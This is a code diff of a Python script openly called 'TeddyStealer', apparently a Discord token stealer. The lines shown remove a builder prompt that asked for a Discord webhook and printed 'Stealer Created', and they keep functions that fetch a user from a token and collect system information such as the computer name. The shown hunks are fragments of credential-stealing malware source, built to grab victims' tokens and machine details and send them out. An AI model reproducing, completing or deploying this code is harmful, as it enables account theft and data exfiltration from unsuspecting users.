@@ -1,4 +1,4 @@
-import os, re, json, random, platform, socket, uuid, requests, time, zipfile
+import os, re, json, random, platform, socket, uuid, requests, time
 from colorama import Fore, init
 import discord
 
@@ -21,29 +21,10 @@ pcname = (os.getenv('COMPUTERNAME'))
 def endHandler():
   os._exit(0)
 
-def checkhook(hook):
-    if not "api/webhooks" in hook:
-        print(f"\nInvalid Webhook.")
-        time.sleep(1)
-        endHandler()
-
-
-print(f"{blue}Hello " + pcname)
-
-webhook = input(f"{dblue}Please Input Your Webhook: ")
-checkhook(webhook)
-
-time.sleep(1)
-print('Building..')
-time.sleep(1)
-
 with open('Stealer.anon','w',encoding='utf8') as f:
     f.write('Thanks For Token')
     f.close()
     time.sleep(1.7)
-
-time.sleep(2)
-print(f"{dgreen}Stealer Created")
 
 
 def retrieve_user(token):
@@ -66,8 +47,6 @@ def system_info(return_type=0):
         return info
     else:
         return json.dumps(info)
-
-
 
 
 class TeddyStealer:
